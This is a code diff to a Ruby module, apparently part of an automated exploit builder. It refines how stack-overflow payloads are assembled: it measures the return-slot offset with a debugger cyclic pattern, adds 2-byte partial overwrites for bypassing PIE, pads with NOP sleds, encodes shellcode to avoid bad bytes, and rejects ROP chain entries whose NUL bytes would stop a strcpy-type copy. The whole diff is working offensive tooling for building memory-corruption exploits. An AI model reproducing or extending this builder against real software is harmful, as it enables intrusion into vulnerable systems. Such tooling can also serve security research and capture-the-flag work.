@@ -44,17 +44,16 @@ module Lictor
       end
       offset = static&.dig(:offset)
       offset_source = offset ? "static-frame" : nil
-      unless offset
-        offset = AugureProfiler::Triage.offset(binary)
-        offset_source = "gdb-cyclic" if offset
-      end
-
       layouts = layouts_for(technique, packs)
       # the measured offset serves the return-slot layouts only: the
       # fmtstr class addresses the stack through the format itself, the
       # fmt_offset fact carries the buffer's argument index - no return
       # slot to measure
       needs_offset = layouts.any? { |(_, layout)| layout.flatten.include?("measured_offset") }
+      if needs_offset && !offset
+        offset = AugureProfiler::Triage.offset(binary)
+        offset_source = "gdb-cyclic" if offset
+      end
       unless offset || !needs_offset
         raise BuildError,
           "no measured offset - static analysis found no controlled return and the debugger did not either"
@@ -134,10 +133,11 @@ module Lictor
         when "padding"
           filler = (slot[2] == "sled") ? "\x90" : "A"
           body << (filler * offset).b
-        when "qword", "dword"
+        when "qword", "dword", "word"
           # dword is 4 bytes WHATEVER the arch (a partial overwrite);
+          # word is 2 bytes (the PIE page hop: the low 16 bits only);
           # qword is the arch's pointer width (8 on x64, 4 on x86)
-          slot_width = (slot[0] == "dword") ? "L<" : width
+          slot_width = {"dword" => "L<", "word" => "S<"}[slot[0]] || width
           value, source = resolve_addr(facts, slot[1], slot_width)
           ret ||= value
           ret_source ||= source
@@ -169,11 +169,40 @@ module Lictor
           sc = AugureProfiler::Encoder.encode(sc.b, badchars: [0x00], arch: arch)[:bytes]
           body << sc.b
         when "chain"
-          slot[1..].each do |ref|
+          # the strcpy family stops the copy at the first NUL: a chain
+          # qword carrying a NUL byte truncates the copy BEFORE the rest
+          # of the chain lands. The bounded channels (read/fgets/...)
+          # copy the exact count - NULs ride whole. The sink fact names
+          # the channel; without it the builder builds (the old shape).
+          sink = facts["sink"]&.first&.first
+          nul_channel = sink && AugureProfiler::StaticOffset::UNSAFE_CALLS.include?(sink)
+          refs = slot[1..]
+          refs.each_with_index do |ref, i|
             value, source = resolve_addr(facts, ref, width)
             ret ||= value
             ret_source ||= source
             body << [value].pack(width)
+            next unless nul_channel
+
+            bytes = [value].pack(width)
+            if i < refs.size - 1
+              # a middle qword must ride NUL-free: the copy stops at its
+              # first NUL, the rest of the chain never lands
+              if bytes.include?("\x00")
+                raise BuildError,
+                  "#{ref} = 0x#{value.to_s(16)} carries a NUL byte - the #{sink} channel " \
+                  "stops the copy before the rest of the chain lands"
+              end
+            else
+              # the last qword may ride partial: the stack keeps the high
+              # bytes - its first NUL must be followed by zeros only
+              first_nul = bytes.bytes.index(0)
+              if first_nul && !bytes.bytes[first_nul..].all?(&:zero?)
+                raise BuildError,
+                  "#{ref} = 0x#{value.to_s(16)} carries a NUL byte before its trailing zeros - " \
+                  "the #{sink} channel would land a partial overwrite of the wrong value"
+              end
+            end
           end
         else
           raise BuildError, "unknown build slot #{slot[0].inspect}"
